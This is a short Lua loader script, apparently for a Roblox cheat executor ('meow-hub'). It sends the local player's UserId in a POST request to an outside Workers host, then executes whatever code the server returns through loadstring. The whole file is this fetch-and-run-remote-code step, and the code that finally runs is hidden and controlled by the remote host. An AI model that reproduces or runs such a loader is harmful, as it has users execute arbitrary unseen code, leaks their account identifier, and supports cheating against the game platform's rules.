local _HS = game:GetService("HttpService")
local uid = tostring(game:GetService("Players").LocalPlayer.UserId)
local _req = http_request or request
loadstring(_req({
    Url = "https://meow-hub-verify.luizoplinihotmail.workers.dev",
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = _HS:JSONEncode({action = "get_script", userId = uid})
}).Body)()